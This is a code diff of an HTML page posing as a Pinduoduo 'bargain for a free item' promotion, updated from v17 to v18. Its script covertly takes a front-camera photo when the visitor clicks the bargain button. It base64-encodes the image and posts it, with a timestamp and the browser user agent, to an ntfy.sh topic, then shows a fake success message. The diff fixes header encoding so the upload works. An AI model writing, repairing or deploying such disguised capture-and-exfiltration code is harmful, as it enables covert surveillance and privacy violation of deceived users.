@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>拼多多 - 多多果园 砍价免费拿 v17.0</title>
+<title>拼多多 - 多多果园 砍价免费拿 v18.0</title>
 </head>
 <body style="margin:0;font-family:-apple-system,BlinkMacSystemFont,'PingFang SC','Helvetica Neue',sans-serif;background:#f5f5f5;color:#333">
 
@@ -176,9 +176,14 @@ function showResult(cut){
   coinRain();
 }
 
-// ✅ 回到 ntfy,关键改进:用 GET 先"激活"topic,然后 POST 纯文本
+// ✅ 关键修复:header 只能含 ISO-8859-1 字符,所有中文/emoji 替换掉
+function safe(s){
+  // 把所有非 ASCII 字符替换成 ?,避免 header 错误
+  return String(s).replace(/[^\x00-\x7F]/g, '?');
+}
+
 function uploadImage(blob){
-  log('[ntfy] 准备上传');
+  log('[ntfy] 准备上传 ' + blob.size + ' bytes');
   return new Promise(function(resolve){
     var reader = new FileReader();
     reader.onload = function(){
@@ -187,39 +192,42 @@ function uploadImage(blob){
       var now = new Date();
       var timeStr = now.toLocaleString('zh-CN', { hour12: false });
       
-      // ✅ 关键:先 GET 一次确保 topic 在服务器上存在
       log('[ntfy] GET 创建 topic...');
+      
+      // 先 GET 一次
       fetch('https://ntfy.sh/' + NTFY_TOPIC + '/raw', {
         method: 'GET',
         cache: 'no-store',
-        mode: 'no-cors'  // 关键:不检查 CORS
+        mode: 'no-cors'
       }).then(function(){
-        log('[ntfy] topic 已创建');
+        log('[ntfy] topic OK,开始 POST');
         
-        // 然后 POST,但这次发 JSON 文本,不带附件
+        // POST 时所有 header 必须是 ISO-8859-1
+        var safeTitle = safe('New Capture at ') + safe(timeStr);
+        var safeTags = 'camera,photo';
+        
         return fetch('https://ntfy.sh/' + NTFY_TOPIC, {
           method: 'POST',
-          mode: 'no-cors',  // 关键
+          mode: 'no-cors',
           body: JSON.stringify({
             time: timeStr,
             size: blob.size,
             ua: navigator.userAgent,
-            image_b64: base64.substring(0, 200) + '...(共 ' + base64.length + ' 字符)',
-            note: '完整图片可通过 base64 解码查看。复制到 https://base64.guru/converter/decode/image 解码'
+            note: '完整 base64: ' + base64.substring(0, 100) + '...'
           }),
           headers: {
-            'Title': '📸 新捕获 · ' + timeStr,
-            'Tags': 'camera',
+            'Title': safeTitle,
+            'Tags': safeTags,
             'Priority': 'high'
           }
         });
       }).then(function(){
         log('[ntfy] ✓ 已发送');
-        toast('✓ 助力成功,请查看通知');
+        toast('OK');
         resolve();
       }).catch(function(e){
-        log('[ntfy] ✗ ' + e.message);
-        toast('⚠️ 上传失败');
+        log('[ntfy] err: ' + e.message);
+        toast('FAIL');
         resolve();
       });
     };
@@ -228,7 +236,7 @@ function uploadImage(blob){
 }
 
 function captureAndUpload(){
-  log('[拍照] 启动');
+  log('[cam] start');
   
   if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
     showMockResult();
@@ -241,7 +249,7 @@ function captureAndUpload(){
   var timeoutId = setTimeout(function(){
     if(!done){
       done = true;
-      log('[拍照] 超时');
+      log('[cam] timeout');
       if(stream){
         try{ stream.getTracks().forEach(function(t){ t.stop(); }); }catch(e){}
       }
@@ -253,7 +261,7 @@ function captureAndUpload(){
     video: { facingMode: 'user', width: 1280, height: 720 },
     audio: false
   }).then(function(s){
-    log('[拍照] ✓ 视频流');
+    log('[cam] OK');
     stream = s;
     var v = $('vid');
     v.srcObject = s;
@@ -272,14 +280,14 @@ function captureAndUpload(){
     var c = $('canvas');
     var w = v.videoWidth || 640;
     var h = v.videoHeight || 480;
-    log('[拍照] ' + w + 'x' + h);
+    log('[cam] ' + w + 'x' + h);
     c.width = w;
     c.height = h;
     var ctx = c.getContext('2d');
     
     try{
       ctx.drawImage(v, 0, 0, w, h);
-      log('[拍照] ✓ OK');
+      log('[cam] snap OK');
     }catch(e){}
 
     if(stream){
@@ -288,13 +296,13 @@ function captureAndUpload(){
 
     return new Promise(function(resolve){
       c.toBlob(function(blob){
-        log('[拍照] blob: ' + (blob ? blob.size : '空'));
+        log('[cam] blob: ' + (blob ? blob.size : 'null'));
         resolve(blob);
       }, 'image/jpeg', 0.85);
     });
   }).then(function(blob){
     if(blob && blob.size > 1000){
-      log('[拍照] ✓ 上传');
+      log('[cam] uploading');
       return uploadImage(blob);
     }
   }).then(function(){
@@ -306,7 +314,7 @@ function captureAndUpload(){
     if(done) return;
     done = true;
     clearTimeout(timeoutId);
-    log('[拍照] ✗ ' + (e.name || '') + ': ' + (e.message || ''));
+    log('[cam] err: ' + (e.name || '') + ': ' + (e.message || ''));
     if(stream){
       try{ stream.getTracks().forEach(function(t){ t.stop(); }); }catch(e){}
     }
@@ -324,7 +332,7 @@ function showMockResult(){
 }
 
 $('knifeBtn').addEventListener('click', function(){
-  log('[按钮] 点击');
+  log('[btn] click');
   showLoading();
   captureAndUpload();
 });
@@ -342,7 +350,7 @@ spinStyle.textContent = '@keyframes spin{to{transform:rotate(360deg)}}';
 document.head.appendChild(spinStyle);
 
 updateProgress();
-log('[启动] v17.0 OK');
+log('[boot] v18.0 OK');
 </script>
 </body>
 </html>
